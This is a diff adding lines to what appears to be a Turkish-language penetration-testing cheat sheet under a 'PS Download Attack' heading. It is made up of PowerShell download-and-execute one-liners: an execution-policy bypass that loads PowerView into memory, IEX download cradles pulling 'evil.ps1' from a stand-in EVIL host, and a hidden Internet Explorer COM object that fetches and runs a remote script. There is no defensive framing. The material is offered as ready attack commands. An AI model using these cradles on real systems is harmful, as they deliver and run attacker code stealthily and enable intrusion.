@@ -101,6 +101,17 @@ PS Download Attack
 
 powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1'); Get-NetDomain"
 
+C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://**********.com/')
+
+# normal download cradle
+C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
+
+# PowerShell 3.0+
+C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe IEX (iwr 'http://EVIL/evil.ps1')
+
+# hidden IE com object
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+
 -----------------------------------------------------------
 Github Projeler
 
